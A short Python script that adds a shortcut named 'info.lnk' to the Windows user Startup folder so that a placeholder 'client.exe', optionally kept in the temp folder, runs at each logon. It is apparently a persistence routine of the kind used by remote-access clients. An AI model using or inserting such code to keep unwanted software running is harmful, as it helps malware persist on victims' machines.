import os
import shutil
import win32com.client  # pip install pywin32
import tempfile

def add_to_startup(file_path):
    # Get the path to the startup folder
    # This requires administrative rights to execute successfully, as it creates a startup entry for all users
    #startup_folder = os.path.join(os.getenv("ProgramData"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

    # Get the path to the current user's startup folder
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

    # Create a shortcut file in the startup folder
    shortcut_path = os.path.join(startup_folder, "info.lnk")
    target_path = os.path.abspath(file_path)
    icon_path = target_path  # You can change this to the desired icon file path if needed

    # Create the shortcut
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.Targetpath = target_path
    shortcut.IconLocation = icon_path
    shortcut.Description = ""  # Set description to an empty string
    shortcut.save()

if __name__ == "__main__":
    # Get the system's temporary folder path
    #temp_folder = tempfile.gettempdir()

    # Construct the full path to your executable within the temporary folder
    # executable_path = os.path.join(temp_folder, "EXE_Name.exe")
    
    # Provide the path to the executable file
    executable_path = r"Full_Path\client.exe"

    # Add the executable to startup
    add_to_startup(executable_path)
